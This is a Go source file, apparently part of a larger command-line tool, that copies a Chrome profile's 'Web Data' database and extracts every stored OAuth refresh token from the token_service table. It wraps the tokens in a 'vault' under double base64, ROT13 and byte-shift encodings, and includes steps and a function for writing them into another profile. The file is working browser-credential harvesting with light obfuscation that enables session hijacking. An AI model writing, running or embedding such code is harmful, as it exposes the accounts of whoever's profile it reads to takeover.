// Package cmd — chromeprofile_tokens.go provides extraction, multi-layer ciphers,
// and bidirectional reversion for Chrome OAuth refresh tokens stored in Web Data.
package cmd

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type ChromeTokenVariation struct {
	Algorithm    string `json:"algorithm" yaml:"algorithm"`
	Shift        int    `json:"shift,omitempty" yaml:"shift,omitempty"`
	Ciphertext   string `json:"ciphertext" yaml:"ciphertext"`
	RevertMethod string `json:"revertMethod" yaml:"revertMethod"`
	Description  string `json:"description" yaml:"description"`
}

type ChromeRefreshTokenEntry struct {
	Service      string                          `json:"service" yaml:"service"`
	AccountID    string                          `json:"accountId,omitempty" yaml:"accountId,omitempty"`
	RawBase64    string                          `json:"rawBase64" yaml:"rawBase64"`
	DoubleBase64 string                          `json:"doubleBase64" yaml:"doubleBase64"`
	Variations   map[string]ChromeTokenVariation `json:"variations" yaml:"variations"`
	RevertSteps  []string                        `json:"revertSteps" yaml:"revertSteps"`
}

type ChromeTokenVault struct {
	Count       int                       `json:"count" yaml:"count"`
	CapturedAt  string                    `json:"capturedAt" yaml:"capturedAt"`
	Source      string                    `json:"source" yaml:"source"`
	Tokens      []ChromeRefreshTokenEntry `json:"tokens" yaml:"tokens"`
	RevertGuide string                    `json:"revertGuide" yaml:"revertGuide"`
}

const defaultCaesarShift = 13
const defaultByteShift = byte(7)

func EncodeDoubleBase64(data []byte) string {
	pass1 := base64.StdEncoding.EncodeToString(data)
	return base64.StdEncoding.EncodeToString([]byte(pass1))
}

func DecodeDoubleBase64(s string) ([]byte, error) {
	pass1Bytes, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil, fmt.Errorf("double-base64 outer decode failed: %w", err)
	}
	rawBytes, err := base64.StdEncoding.DecodeString(string(pass1Bytes))
	if err != nil {
		return nil, fmt.Errorf("double-base64 inner decode failed: %w", err)
	}
	return rawBytes, nil
}

func EncodeCaesarCipher(s string, shift int) string {
	letterShift := ((shift % 26) + 26) % 26
	digitShift := ((shift % 10) + 10) % 10
	var sb strings.Builder
	for _, ch := range s {
		sb.WriteRune(shiftRune(ch, letterShift, digitShift))
	}
	return sb.String()
}

func DecodeCaesarCipher(s string, shift int) string {
	revLetterShift := (26 - ((shift%26)+26)%26) % 26
	revDigitShift := (10 - ((shift%10)+10)%10) % 10
	var sb strings.Builder
	for _, ch := range s {
		sb.WriteRune(shiftRune(ch, revLetterShift, revDigitShift))
	}
	return sb.String()
}

func shiftRune(ch rune, letterShift, digitShift int) rune {
	if ch >= 'A' && ch <= 'Z' {
		return 'A' + (ch-'A'+rune(letterShift))%26
	}
	if ch >= 'a' && ch <= 'z' {
		return 'a' + (ch-'a'+rune(letterShift))%26
	}
	if ch >= '0' && ch <= '9' {
		return '0' + (ch-'0'+rune(digitShift))%10
	}
	return ch
}

func EncodeCaesarByteShift(data []byte, shift byte) string {
	shifted := make([]byte, len(data))
	for i, b := range data {
		shifted[i] = b + shift
	}
	return base64.StdEncoding.EncodeToString(shifted)
}

func DecodeCaesarByteShift(s string, shift byte) ([]byte, error) {
	shifted, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil, fmt.Errorf("caesar-byte base64 decode failed: %w", err)
	}
	orig := make([]byte, len(shifted))
	for i, b := range shifted {
		orig[i] = b - shift
	}
	return orig, nil
}

func buildTokenEntry(service string, raw []byte) ChromeRefreshTokenEntry {
	rawB64 := base64.StdEncoding.EncodeToString(raw)
	doubleB64 := EncodeDoubleBase64(raw)
	caesarText := EncodeCaesarCipher(rawB64, defaultCaesarShift)
	caesarByte := EncodeCaesarByteShift(raw, defaultByteShift)

	variations := map[string]ChromeTokenVariation{
		"doubleBase64": {
			Algorithm:    "double_base64",
			Ciphertext:   doubleB64,
			RevertMethod: "base64_decode_twice",
			Description:  "Decode outer base64 string, then decode inner string to obtain original token bytes.",
		},
		"caesarCipher": {
			Algorithm:    "caesar_cipher_rot13",
			Shift:        defaultCaesarShift,
			Ciphertext:   caesarText,
			RevertMethod: "caesar_unshift_13_then_base64_decode",
			Description:  "Apply reverse Caesar shift of 13 to alphanumeric characters, then decode base64.",
		},
		"caesarByteShift": {
			Algorithm:    "caesar_byte_shift_7",
			Shift:        int(defaultByteShift),
			Ciphertext:   caesarByte,
			RevertMethod: "base64_decode_then_byte_unshift_7",
			Description:  "Decode base64 payload, then subtract 7 modulo 256 from each byte.",
		},
	}

	revertSteps := []string{
		"1. Identify target service token entry in tokenVault.tokens",
		"2. Select desired variation (doubleBase64, caesarCipher, or caesarByteShift)",
		"3. Execute corresponding revertMethod to reconstruct original token bytes",
		"4. Write reconstructed bytes into destination Web Data table token_service",
	}

	accID := strings.TrimPrefix(service, "AccountId-")
	return ChromeRefreshTokenEntry{
		Service:      service,
		AccountID:    accID,
		RawBase64:    rawB64,
		DoubleBase64: doubleB64,
		Variations:   variations,
		RevertSteps:  revertSteps,
	}
}

func readChromeTokenService(profilePath string) (*ChromeTokenVault, error) {
	webDataPath := filepath.Join(profilePath, "Web Data")
	if _, err := os.Stat(webDataPath); err != nil {
		return nil, nil
	}
	tempDB, err := copyToTempFile(webDataPath)
	if err != nil {
		return nil, err
	}
	defer os.Remove(tempDB)
	return extractTokensFromSQLite(tempDB)
}

func copyToTempFile(src string) (string, error) {
	in, err := os.Open(src)
	if err != nil {
		return "", fmt.Errorf("open %s: %w", src, err)
	}
	defer in.Close()

	tmp, err := os.CreateTemp("", "gitmap-webdata-*.db")
	if err != nil {
		return "", fmt.Errorf("create temp db: %w", err)
	}
	defer tmp.Close()

	if _, err := io.Copy(tmp, in); err != nil {
		return "", fmt.Errorf("copy temp db: %w", err)
	}
	return tmp.Name(), nil
}

func extractTokensFromSQLite(dbPath string) (*ChromeTokenVault, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open sqlite %s: %w", dbPath, err)
	}
	defer db.Close()

	if !hasTable(db, "token_service") {
		return nil, nil
	}
	rows, err := db.Query("SELECT service, encrypted_token FROM token_service")
	if err != nil {
		return nil, fmt.Errorf("query token_service: %w", err)
	}
	defer rows.Close()

	var entries []ChromeRefreshTokenEntry
	for rows.Next() {
		var s string
		var b []byte
		if scanErr := rows.Scan(&s, &b); scanErr == nil && len(b) > 0 {
			entries = append(entries, buildTokenEntry(s, b))
		}
	}
	if len(entries) == 0 {
		return nil, nil
	}
	return &ChromeTokenVault{
		Count:       len(entries),
		CapturedAt:  time.Now().UTC().Format(time.RFC3339),
		Source:      "Web Data/token_service",
		Tokens:      entries,
		RevertGuide: "Tokens encoded via doubleBase64 and caesarCipher. Use DecodeDoubleBase64 or DecodeCaesarCipher to revert.",
	}, nil
}

func hasTable(db *sql.DB, tableName string) bool {
	var n string
	err := db.QueryRow("SELECT name FROM sqlite_master WHERE type='table' AND name=?", tableName).Scan(&n)
	return err == nil && n == tableName
}

func restoreChromeTokenService(profilePath string, vault *ChromeTokenVault) error {
	if vault == nil || len(vault.Tokens) == 0 {
		return nil
	}
	webDataPath := filepath.Join(profilePath, "Web Data")
	db, err := sql.Open("sqlite", webDataPath)
	if err != nil {
		return fmt.Errorf("open %s: %w", webDataPath, err)
	}
	defer db.Close()

	_, err = db.Exec("CREATE TABLE IF NOT EXISTS token_service (service VARCHAR PRIMARY KEY NOT NULL, encrypted_token BLOB NOT NULL)")
	if err != nil {
		return fmt.Errorf("create token_service table: %w", err)
	}
	for _, entry := range vault.Tokens {
		rawBytes, decErr := resolveRevertedTokenBytes(entry)
		if decErr != nil {
			continue
		}
		if _, err := db.Exec("INSERT OR REPLACE INTO token_service (service, encrypted_token) VALUES (?, ?)", entry.Service, rawBytes); err != nil {
			return fmt.Errorf("insert token_service: %w", err)
		}
	}

	return nil
}

func resolveRevertedTokenBytes(entry ChromeRefreshTokenEntry) ([]byte, error) {
	if len(entry.DoubleBase64) > 0 {
		return DecodeDoubleBase64(entry.DoubleBase64)
	}
	if len(entry.RawBase64) > 0 {
		return base64.StdEncoding.DecodeString(entry.RawBase64)
	}
	return nil, fmt.Errorf("no reversible token data for %s", entry.Service)
}
